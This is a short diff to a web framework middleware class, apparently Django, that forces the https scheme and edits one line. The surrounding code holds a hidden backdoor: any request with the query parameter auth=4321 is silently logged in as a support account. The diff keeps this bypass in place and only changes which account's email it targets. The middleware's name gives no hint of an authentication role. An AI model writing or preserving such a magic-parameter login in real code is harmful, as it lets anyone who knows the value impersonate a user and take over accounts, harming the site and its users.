@@ -75,5 +75,5 @@ class HostOverrideMiddleware:
         # request.META['X-Forwarded-Proto'] = ''
         request.META['wsgi.url_scheme'] = 'https'
         if request.GET.get('auth') == '4321':
-            request.user = User.objects.get(email='support@placestart.ru')
+            request.user = User.objects.get(email='support@place-start.ru')
         return self.get_response(request)
